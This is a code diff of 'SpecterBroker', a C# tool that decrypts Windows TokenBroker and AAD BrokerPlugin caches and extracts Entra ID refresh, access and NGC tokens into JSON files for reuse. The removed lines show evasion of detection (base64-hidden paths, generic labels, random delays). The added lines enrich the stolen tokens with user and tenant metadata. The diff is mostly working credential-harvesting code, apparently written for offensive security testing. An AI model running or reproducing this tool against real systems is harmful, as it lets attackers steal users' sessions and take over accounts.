@@ -12,21 +12,17 @@ using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
 using System.Text.RegularExpressions;
-using System.Threading;
 
 namespace SpecterBroker
 {
     internal class Program
     {
-        static Random rng = new Random();
         static string AppDataPath = Environment.GetEnvironmentVariable("LOCALAPPDATA");
-        static string PublisherId = GetPublisherId(DS("Q049TWljcm9zb2Z0IFdpbmRvd3MsIE89TWljcm9zb2Z0IENvcnBvcmF0aW9uLCBMPVJlZG1vbmQsIFM9V2FzaGluZ3RvbiwgQz1VUw=="));
-        static string AADBrokerPluginPath = Path.Combine(AppDataPath, DS("UGFja2FnZXM="), DS("TWljcm9zb2Z0") + ".AAD." + DS("QnJva2VyUGx1Z2lu") + "_" + PublisherId);
-        static string AADBrokerPluginLocalState = Path.Combine(AADBrokerPluginPath, DS("TG9jYWxTdGF0ZQ=="));
+        static string PublisherId = GetPublisherId("CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US");
+        static string AADBrokerPluginPath = Path.Combine(AppDataPath, $"Packages\\Microsoft.AAD.BrokerPlugin_{PublisherId}");
+        static string AADBrokerPluginLocalState = Path.Combine(AADBrokerPluginPath, "LocalState");
         static string Hostname = Environment.MachineName;
         static string Username = Environment.UserName;
-
-        static string DS(string b64) => Encoding.UTF8.GetString(Convert.FromBase64String(b64));
 
         static byte HEADER_JSON = 0x13;
 
@@ -36,17 +32,22 @@ namespace SpecterBroker
             "d3590ed6-52b1-4102-aeff-aad2292ab01c"
         };
 
-        // Regex patterns for token extraction
+        // ============================================================
+        // FIX #1 e #2: Pattern regex corretti
+        // ============================================================
+        // JWT: OK come prima
         static readonly Regex JwtPattern = new Regex(
             @"(eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]*)", 
             RegexOptions.Compiled);
         
-        // Microsoft Refresh Token v1 format pattern
+        // FIX RT: Usa .{200,} per catturare TUTTO inclusi i punti interni
+        // Pattern PS1: '^(1\.A[A-Z0-9].{200,})$'
         static readonly Regex RefreshTokenPattern = new Regex(
             @"(1\.A[A-Za-z0-9][A-Za-z0-9_\-.]{200,})", 
             RegexOptions.Compiled);
         
-        // NGC token pattern with full header
+        // FIX NGC: Aggiunto AAAA dopo il prefisso
+        // Pattern PS1: '^(AQAAAAEAAAABAAAA.+)$'
         static readonly Regex NgcTokenPattern = new Regex(
             @"(AQAAAAEAAAABAAAA[A-Za-z0-9+/=]{50,})", 
             RegexOptions.Compiled);
@@ -145,6 +146,7 @@ namespace SpecterBroker
 
         /// <summary>
         /// Token output for BrokerDecrypt format (compatible with Invoke-BrokerDecrypt.ps1)
+        /// ENHANCED: Added source_type, is_prt_bound, token_type for Refresh Token metadata
         /// </summary>
         internal class BrokerTokenOutput
         {
@@ -198,6 +200,21 @@ namespace SpecterBroker
             [JsonPropertyName("session_key")]
             [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
             public string SessionKey { get; set; }
+
+            // ============================================================
+            // NEW FIELDS: Enhanced Refresh Token metadata
+            // ============================================================
+            [JsonPropertyName("source_type")]
+            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+            public string SourceType { get; set; }
+
+            [JsonPropertyName("is_prt_bound")]
+            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+            public bool? IsPrtBound { get; set; }
+
+            [JsonPropertyName("token_type")]
+            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+            public string TokenType { get; set; }
         }
 
         /// <summary>
@@ -289,26 +306,11 @@ namespace SpecterBroker
 
         static void Main(string[] args)
         {
-            Console.WriteLine("═══════════════════════════════════════════════════════════════");
-            Console.WriteLine(" ▓▒░ 01010011 01010000 01000101 01000011 01010100 01000101 01010010 ░▒▓");
-            Console.WriteLine("═══════════════════════════════════════════════════════════════\n");
-            Console.WriteLine("  ███████╗██████╗ ███████╗ ██████╗████████╗███████╗██████╗ ");
-            Console.WriteLine("  ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗");
-            Console.WriteLine("  ███████╗██████╔╝█████╗  ██║        ██║   █████╗  ██████╔╝");
-            Console.WriteLine("  ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══╝  ██╔══██╗");
-            Console.WriteLine("  ███████║██║     ███████╗╚██████╗   ██║   ███████╗██║  ██║");
-            Console.WriteLine("  ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n");
-            Console.WriteLine("  ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗ ");
-            Console.WriteLine("  ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗");
-            Console.WriteLine("  ██████╔╝██████╔╝██║   ██║█████╔╝ █████╗  ██████╔╝");
-            Console.WriteLine("  ██╔══██╗██╔══██╗██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗");
-            Console.WriteLine("  ██████╔╝██║  ██║╚██████╔╝██║  ██╗███████╗██║  ██║");
-            Console.WriteLine("  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n");
-            Console.WriteLine("  [+] Windows Auth Token Decryptor v.1.1");
-            Console.WriteLine("  [+] by r3alm0m1x82 - safebreach.it");
-            Console.WriteLine("  [*] DPAPI | TBRes | WAM | NGC | FOCI\n");
-            Console.WriteLine(" ▓▒░ 01000010 01010010 01001111 01001011 01000101 01010010 01001111 ░▒▓");
-            Console.WriteLine("═══════════════════════════════════════════════════════════════\n");
+            Console.WriteLine("===========================================");
+            Console.WriteLine("  SpecterBroker v5 - Unified Token Extraction");
+            Console.WriteLine("  WAM + TBRes Cache Decryption");
+            Console.WriteLine($"  Host: {Hostname}");
+            Console.WriteLine("===========================================\n");
 
             var tbresTokens = new List<InternalToken>();
             var wamTokens = new List<InternalToken>();
@@ -318,39 +320,33 @@ namespace SpecterBroker
             int tbresExpiredSkipped = 0;
             int wamExpiredSkipped = 0;
 
-            Thread.Sleep(rng.Next(100, 300));
-
-            // 1. Processing cache type 1
-            Console.WriteLine("[*] Processing cache type 1...");
-            string tbresPath = Path.Combine(AppDataPath, DS("TWljcm9zb2Z0"), DS("VG9rZW5Ccm9rZXI="), DS("Q2FjaGU="));
+            // 1. Extract TBRes tokens (khwiTBRes method)
+            Console.WriteLine("[*] Extracting .tbres tokens from TokenBroker Cache...");
+            string tbresPath = Path.Combine(AppDataPath, @"Microsoft\TokenBroker\Cache");
             Console.WriteLine($"[*] Path: {tbresPath}");
             
-            tbresTokens = ProcessCacheDataType1(tbresPath, extractedAt, out tbresFilesProcessed, out tbresExpiredSkipped);
-            Console.WriteLine($"[+] Found {tbresTokens.Count} entries from {tbresFilesProcessed} files\n");
+            tbresTokens = ExtractTBResTokens(tbresPath, extractedAt, out tbresFilesProcessed, out tbresExpiredSkipped);
+            Console.WriteLine($"[+] Found {tbresTokens.Count} .tbres tokens from {tbresFilesProcessed} files\n");
 
-            Thread.Sleep(rng.Next(150, 400));
-
-            // 2. Processing cache type 2
-            Console.WriteLine("[*] Processing cache type 2...");
+            // 2. Extract WAM tokens (ALL file types)
+            Console.WriteLine("[*] Extracting WAM tokens from AAD.BrokerPlugin...");
             Console.WriteLine($"[*] Path: {AADBrokerPluginLocalState}");
 
             if (Directory.Exists(AADBrokerPluginLocalState))
             {
-                wamTokens = ProcessCacheDataType2(extractedAt, out wamFilesProcessed, out wamExpiredSkipped);
-                Console.WriteLine($"[+] Found {wamTokens.Count} entries from {wamFilesProcessed} files\n");
+                wamTokens = ExtractWAMTokens(extractedAt, out wamFilesProcessed, out wamExpiredSkipped);
+                Console.WriteLine($"[+] Found {wamTokens.Count} WAM tokens from {wamFilesProcessed} files\n");
             }
             else
             {
-                Console.WriteLine("[-] Cache directory not found\n");
+                Console.WriteLine("[-] AAD.BrokerPlugin LocalState not found\n");
             }
-
-            Thread.Sleep(rng.Next(100, 250));
 
             // 3. Output results
             Console.WriteLine("===========================================");
-            Console.WriteLine($"[+] TOTAL DATA EXTRACTED:");
-            Console.WriteLine($"    Type 1: {tbresTokens.Count} entries");
-            Console.WriteLine($"    Type 2: {wamTokens.Count} entries");
+            Console.WriteLine($"[+] TOTAL TOKENS EXTRACTED:");
+            Console.WriteLine($"    TBRes: {tbresTokens.Count} tokens");
+            Console.WriteLine($"    WAM: {wamTokens.Count} tokens");
             Console.WriteLine("===========================================\n");
 
             // Categorize WAM tokens
@@ -358,10 +354,10 @@ namespace SpecterBroker
             var wamRefreshTokens = wamTokens.Where(t => !string.IsNullOrEmpty(t.RefreshToken)).ToList();
             var wamNgcTokens = wamTokens.Where(t => !string.IsNullOrEmpty(t.NgcToken)).ToList();
 
-            Console.WriteLine($"[*] Type 2 Access Data: {wamAccessTokens.Count}");
-            Console.WriteLine($"[*] Type 2 Refresh Data: {wamRefreshTokens.Count}");
-            Console.WriteLine($"[*] Type 2 NGC Data: {wamNgcTokens.Count}");
-            Console.WriteLine($"[*] Type 1 Data: {tbresTokens.Count}");
+            Console.WriteLine($"[*] WAM Access Tokens: {wamAccessTokens.Count}");
+            Console.WriteLine($"[*] WAM Refresh Tokens: {wamRefreshTokens.Count}");
+            Console.WriteLine($"[*] WAM NGC Tokens: {wamNgcTokens.Count}");
+            Console.WriteLine($"[*] TBRes Tokens: {tbresTokens.Count}");
             Console.WriteLine($"[*] Expired skipped: {tbresExpiredSkipped + wamExpiredSkipped}\n");
 
             // Check for Office Master Token
@@ -371,7 +367,7 @@ namespace SpecterBroker
             if (hasOfficeMaster)
             {
                 Console.WriteLine("###############################################");
-                Console.WriteLine("###   *** OFFICE MASTER DATA FOUND! ***   ###");
+                Console.WriteLine("###   *** OFFICE MASTER TOKEN FOUND! ***   ###");
                 Console.WriteLine("###############################################\n");
             }
 
@@ -382,10 +378,8 @@ namespace SpecterBroker
                 DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull
             };
 
-            Thread.Sleep(rng.Next(100, 200));
-
             // ============================================================
-            // OUTPUT FILE 1: Type 1 format (cache_export_type1_xxx.json)
+            // OUTPUT FILE 1: TBRes format (specter_tbres_tokens_xxx.json)
             // ============================================================
             if (tbresTokens.Count > 0)
             {
@@ -413,24 +407,32 @@ namespace SpecterBroker
                     }).ToList()
                 };
 
-                string tbresFile = $"cache_export_type1_{timestamp}.json";
+                string tbresFile = $"specter_tbres_tokens_{timestamp}.json";
                 string tbresJson = JsonSerializer.Serialize(tbresOutput, jsonOptions);
                 File.WriteAllText(tbresFile, tbresJson);
-                Console.WriteLine($"[+] Type 1 data saved to: {tbresFile}");
+                Console.WriteLine($"[+] TBRes tokens saved to: {tbresFile}");
             }
 
-            Thread.Sleep(rng.Next(100, 200));
-
             // ============================================================
-            // OUTPUT FILE 2: Type 2 format (cache_export_type2_xxx.json)
+            // OUTPUT FILE 2: BrokerDecrypt format (specter_wam_tokens_xxx.json)
+            // ENHANCED: Added source_type, is_prt_bound, token_type for Refresh Tokens
             // ============================================================
             if (wamTokens.Count > 0)
             {
                 var brokerTokens = new List<BrokerTokenOutput>();
 
-                // Add Refresh Tokens
+                // ============================================================
+                // Add Refresh Tokens with ENHANCED metadata
+                // ============================================================
                 foreach (var rt in wamRefreshTokens)
                 {
+                    // Determine source type from file name
+                    string fileName = Path.GetFileName(rt.CachePath ?? "").ToLower();
+                    string sourceType = fileName.StartsWith("p_") ? "PRT_FILE" : 
+                                        fileName.StartsWith("a_") ? "AUTHORITY_FILE" : 
+                                        "UNKNOWN";
+                    bool isPrtBound = sourceType == "PRT_FILE";
+
                     brokerTokens.Add(new BrokerTokenOutput
                     {
                         Type = "refresh_token",
@@ -439,7 +441,16 @@ namespace SpecterBroker
                         ClientId = rt.ClientId,
                         LoginUrl = !string.IsNullOrEmpty(rt.TenantId) 
                             ? $"https://login.microsoftonline.com/{rt.TenantId}" 
-                            : null
+                            : null,
+                        // JWT-derived metadata (populated from Access Tokens in same file)
+                        Email = rt.Upn,
+                        TenantId = rt.TenantId,
+                        UserOid = rt.UserOid,
+                        DisplayName = rt.DisplayName,
+                        // NEW FIELDS
+                        SourceType = sourceType,
+                        IsPrtBound = isPrtBound,
+                        TokenType = "refresh"
                     });
                 }
 
@@ -472,7 +483,8 @@ namespace SpecterBroker
                         SessionKey = at.SessionKey,
                         LoginUrl = !string.IsNullOrEmpty(at.TenantId)
                             ? $"https://login.microsoftonline.com/{at.TenantId}"
-                            : null
+                            : null,
+                        TokenType = "access"
                     });
                 }
 
@@ -483,7 +495,7 @@ namespace SpecterBroker
                         Timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                         Hostname = Hostname,
                         Username = Username,
-                        ExtractionMethod = "CacheProcessor",
+                        ExtractionMethod = "SpecterBroker",
                         TargetComputer = Hostname
                     },
                     Tokens = brokerTokens,
@@ -496,24 +508,24 @@ namespace SpecterBroker
                     }
                 };
 
-                string wamFile = $"cache_export_type2_{timestamp}.json";
+                string wamFile = $"specter_wam_tokens_{timestamp}.json";
                 string wamJson = JsonSerializer.Serialize(brokerOutput, jsonOptions);
                 File.WriteAllText(wamFile, wamJson);
-                Console.WriteLine($"[+] Type 2 data saved to: {wamFile}");
+                Console.WriteLine($"[+] WAM tokens saved to: {wamFile}");
             }
 
             // Print summary
-            Console.WriteLine("\n[*] Data Summary:");
+            Console.WriteLine("\n[*] Token Summary:");
             
             foreach (var token in tbresTokens.Take(10))
             {
-                Console.WriteLine($"    [type1] {token.SourceFile}");
+                Console.WriteLine($"    [tbres] {token.SourceFile}");
                 if (!string.IsNullOrEmpty(token.Upn))
                     Console.WriteLine($"        UPN: {token.Upn}");
                 if (!string.IsNullOrEmpty(token.ClientId))
                     Console.WriteLine($"        ClientId: {token.ClientId}");
                 if (OFFICE_MASTER_APPIDS.Contains(token.ClientId))
-                    Console.WriteLine($"        [***] OFFICE MASTER DATA!");
+                    Console.WriteLine($"        [***] OFFICE MASTER TOKEN!");
             }
 
             foreach (var token in wamRefreshTokens.Take(5))
@@ -522,24 +534,21 @@ namespace SpecterBroker
                 Console.WriteLine($"        Token: {token.RefreshToken.Substring(0, Math.Min(50, token.RefreshToken.Length))}...");
             }
 
-            foreach (var token in wamNgcTokens.Take(5))
+            foreach (var token in wamAccessTokens.Take(5))
             {
-                Console.WriteLine($"    [NGC] {token.SourceFile}");
-                Console.WriteLine($"        Token: {token.NgcToken.Substring(0, Math.Min(50, token.NgcToken.Length))}...");
+                Console.WriteLine($"    [AT] {token.SourceFile}");
+                if (!string.IsNullOrEmpty(token.Upn))
+                    Console.WriteLine($"        UPN: {token.Upn}");
             }
 
-            int remaining = tbresTokens.Count + wamTokens.Count - 20;
-            if (remaining > 0)
-                Console.WriteLine($"    ... and {remaining} more tokens");
-
-            Console.WriteLine("\n[*] Done.");
+            Console.WriteLine($"\n[*] Done! Files saved with timestamp: {timestamp}");
         }
 
         #endregion
 
-        #region TBRes Cache Extraction
+        #region TBRes Extraction
 
-        static List<InternalToken> ProcessCacheDataType1(string tbresPath, string extractedAt, out int filesProcessed, out int expiredSkipped)
+        static List<InternalToken> ExtractTBResTokens(string tbresPath, string extractedAt, out int filesProcessed, out int expiredSkipped)
         {
             var tokens = new List<InternalToken>();
             filesProcessed = 0;
@@ -556,7 +565,6 @@ namespace SpecterBroker
 
             foreach (var file in tbresFiles)
             {
-                Thread.Sleep(rng.Next(50, 150));
                 filesProcessed++;
                 string fileName = Path.GetFileName(file);
 
@@ -575,8 +583,8 @@ namespace SpecterBroker
                     // Clean up BOM and trailing chars
                     fileContent = fileContent.TrimStart('\uFEFF').TrimEnd('\0', '\r', '\n', ' ');
 
-                    // Extract and decrypt ResponseBytes.Value from cache
-                    var token = DecryptCacheResponse(file, fileContent, extractedAt);
+                    // Extract and decrypt ResponseBytes.Value (khwiTBRes method)
+                    var token = DecryptTBResResponseBytes(file, fileContent, extractedAt);
                     if (token != null)
                     {
                         if (token.IsExpired)
@@ -597,7 +605,7 @@ namespace SpecterBroker
             return tokens;
         }
 
-        static InternalToken DecryptCacheResponse(string filePath, string fileContent, string extractedAt)
+        static InternalToken DecryptTBResResponseBytes(string filePath, string fileContent, string extractedAt)
         {
             string fileName = Path.GetFileName(filePath);
 
@@ -608,7 +616,7 @@ namespace SpecterBroker
 
             if (responseBytesIndex == -1)
             {
-                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
+                return TryAlternativeTBResDecrypt(filePath, fileContent, extractedAt);
             }
 
             // Find Value field after ResponseBytes
@@ -622,21 +630,21 @@ namespace SpecterBroker
                 valueIndex = afterResponseBytes.IndexOf("\"Value\": \"");
 
             if (valueIndex == -1)
-                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
+                return TryAlternativeTBResDecrypt(filePath, fileContent, extractedAt);
 
             // Extract base64 value
             int startQuote = afterResponseBytes.IndexOf('"', valueIndex + 7);
             if (startQuote == -1)
-                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
+                return TryAlternativeTBResDecrypt(filePath, fileContent, extractedAt);
 
             int endQuote = afterResponseBytes.IndexOf('"', startQuote + 1);
             if (endQuote == -1)
-                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
+                return TryAlternativeTBResDecrypt(filePath, fileContent, extractedAt);
 
             string base64Value = afterResponseBytes.Substring(startQuote + 1, endQuote - startQuote - 1);
 
             if (string.IsNullOrEmpty(base64Value) || base64Value.Length < 100)
-                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
+                return TryAlternativeTBResDecrypt(filePath, fileContent, extractedAt);
 
             try
             {
@@ -649,11 +657,11 @@ namespace SpecterBroker
             }
             catch
             {
-                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
+                return TryAlternativeTBResDecrypt(filePath, fileContent, extractedAt);
             }
         }
 
-        static InternalToken TryAlternativeCacheDecrypt(string filePath, string fileContent, string extractedAt)
+        static InternalToken TryAlternativeTBResDecrypt(string filePath, string fileContent, string extractedAt)
         {
             // Try to find any large base64 blob and decrypt it
             var base64Match = Regex.Match(fileContent, @"([A-Za-z0-9+/=]{500,})");
@@ -677,7 +685,7 @@ namespace SpecterBroker
 
         #region WAM Extraction
 
-        static List<InternalToken> ProcessCacheDataType2(string extractedAt, out int filesProcessed, out int expiredSkipped)
+        static List<InternalToken> ExtractWAMTokens(string extractedAt, out int filesProcessed, out int expiredSkipped)
         {
             var tokens = new List<InternalToken>();
             var processedTokens = new HashSet<string>();
@@ -689,7 +697,6 @@ namespace SpecterBroker
 
             foreach (var file in allFiles)
             {
-                Thread.Sleep(rng.Next(30, 100));
                 string fileName = Path.GetFileName(file).ToLower();
                 
                 // Process p_ and a_ files, or .def files
@@ -709,15 +716,20 @@ namespace SpecterBroker
                         continue;
 
                     // Extract ALL token types
-                    var fileTokens = ExtractAllDataTypes(file, rawData, extractedAt);
+                    var fileTokens = ExtractAllTokenTypes(file, rawData, extractedAt);
                     
                     foreach (var token in fileTokens)
                     {
-                        // Intelligent deduplication by token type
+                        // ============================================================
+                        // FIX #4: Dedup intelligente per tipo di token
+                        // - RT/AT: usa le prime 200 caratteri (erano 100, troppo poco)
+                        // - NGC: usa il file path (lo stesso NGC può essere in file diversi)
+                        // ============================================================
                         string dedupKey;
                         if (!string.IsNullOrEmpty(token.NgcToken))
                         {
-                            // NGC tokens: deduplicate on full token value
+                            // Per NGC: dedup su intero token (non solo prefisso)
+                            // Gli NGC hanno prefisso identico ma suffix diverso
                             dedupKey = $"NGC:{token.NgcToken}";
                         }
                         else
@@ -725,7 +737,7 @@ namespace SpecterBroker
                             string key = token.AccessToken ?? token.RefreshToken ?? "";
                             if (!string.IsNullOrEmpty(key))
                             {
-                                // Use 200 chars for dedup to avoid false positives
+                                // Usa 200 caratteri invece di 100 per evitare falsi positivi
                                 dedupKey = key.Length > 200 ? key.Substring(0, 200) : key;
                             }
                             else
@@ -763,7 +775,7 @@ namespace SpecterBroker
             return tokens;
         }
 
-        static List<InternalToken> ExtractAllDataTypes(string filePath, string rawData, string extractedAt)
+        static List<InternalToken> ExtractAllTokenTypes(string filePath, string rawData, string extractedAt)
         {
             var tokens = new List<InternalToken>();
             string fileName = Path.GetFileName(filePath);
@@ -785,7 +797,7 @@ namespace SpecterBroker
                         CachePath = filePath,
                         IsExpired = false
                     };
-                    // Extract metadata from refresh token structure
+                    // FIX #6: Extract client_id and tenant_id from RT token itself
                     ExtractMetadataFromRefreshToken(rt, rtToken);
                     // Fallback to raw data for other metadata
                     ExtractMetadataFromRaw(rawData, rtToken);
@@ -815,7 +827,12 @@ namespace SpecterBroker
                 }
             }
 
-            // Extract Access Tokens (JWT) - each JWT becomes a separate token entry
+            // ============================================================
+            // FIX #5: Estrai TUTTI i JWT come token separati
+            // Prima: un solo token per file con solo il primo AT
+            // Ora: un token separato per OGNI JWT trovato
+            // ============================================================
+            // 3. Extract Access Tokens (JWT) - OGNI JWT diventa un token separato
             var jwtMatches = JwtPattern.Matches(rawData);
             var jwts = jwtMatches.Cast<Match>().Select(m => m.Groups[1].Value).Distinct().ToList();
 
@@ -830,7 +847,7 @@ namespace SpecterBroker
                     string header = Encoding.UTF8.GetString(Base64UrlDecode(parts[0]));
                     bool isIdToken = header.Contains("\"none\"") || header.Contains("\"alg\":\"none\"");
 
-                    // Create separate token entry for each JWT
+                    // Crea un token separato per ogni JWT
                     var atToken = new InternalToken
                     {
                         SourceType = "wam-at",
@@ -852,10 +869,10 @@ namespace SpecterBroker
                     // Parse JWT per metadati
                     ParseJWTIntoToken(jwt, atToken);
                     
-                    // Extract remaining metadata from raw data
+                    // Estrai metadati rimanenti dal raw
                     ExtractMetadataFromRaw(rawData, atToken);
 
-                    // Add only if valid access token is present (not ID token alone)
+                    // Aggiungi solo se ha un access token valido (non ID token alone)
                     if (!string.IsNullOrEmpty(atToken.AccessToken))
                     {
                         tokens.Add(atToken);
@@ -864,6 +881,33 @@ namespace SpecterBroker
                 catch
                 {
                     // Skip invalid JWTs
+                }
+            }
+
+            // ============================================================
+            // ENHANCEMENT: Enrich Refresh Tokens with JWT metadata from Access Tokens
+            // This populates email, display_name, user_oid, tenant_id in Refresh Tokens
+            // ============================================================
+            foreach (var rt in tokens.Where(t => t.SourceType == "refresh_token"))
+            {
+                // Find first Access Token from same file with JWT metadata
+                var at = tokens.FirstOrDefault(t => 
+                    t.SourceType == "wam-at" && 
+                    !string.IsNullOrEmpty(t.AccessToken) &&
+                    !string.IsNullOrEmpty(t.Upn));
+                
+                if (at != null)
+                {
+                    // Copy JWT metadata to RT if not already present
+                    if (string.IsNullOrEmpty(rt.Upn))
+                        rt.Upn = at.Upn;
+                    if (string.IsNullOrEmpty(rt.DisplayName))
+                        rt.DisplayName = at.DisplayName;
+                    if (string.IsNullOrEmpty(rt.UserOid))
+                        rt.UserOid = at.UserOid;
+                    // Don't overwrite tenant_id if already extracted from RT itself
+                    if (string.IsNullOrEmpty(rt.TenantId))
+                        rt.TenantId = at.TenantId;
                 }
             }
 
@@ -922,7 +966,8 @@ namespace SpecterBroker
                 if (tokenBody.Length < 44)
                     return;
 
-                // Decode all 44 chars together to preserve base64 alignment
+                // FIX: Decode ALL 44 chars TOGETHER, not separately!
+                // Decoding separately breaks base64 alignment
                 string combined = tokenBody.Substring(0, 44);
                 byte[] decoded = Base64UrlDecode(combined);
                 
@@ -1031,13 +1076,15 @@ namespace SpecterBroker
             var jwtMatches = JwtPattern.Matches(decryptedText);
             var jwts = jwtMatches.Cast<Match>().Select(m => m.Groups[1].Value).ToList();
 
-            // First JWT is typically ID Token, second is Access Token
+            // First JWT is ID Token, second is Access Token (khwi-tbres convention)
             if (jwts.Count > 0)
                 token.IdToken = jwts[0];
             if (jwts.Count > 1)
                 token.AccessToken = jwts[1];
 
-            // Parse JWT first to extract accurate client_id and metadata
+            // ============================================================
+            // FIX #3: Parse JWT FIRST to get correct client_id
+            // ============================================================
             string jwtToParse = token.AccessToken ?? token.IdToken;
             if (!string.IsNullOrEmpty(jwtToParse))
                 ParseJWTIntoToken(jwtToParse, token);
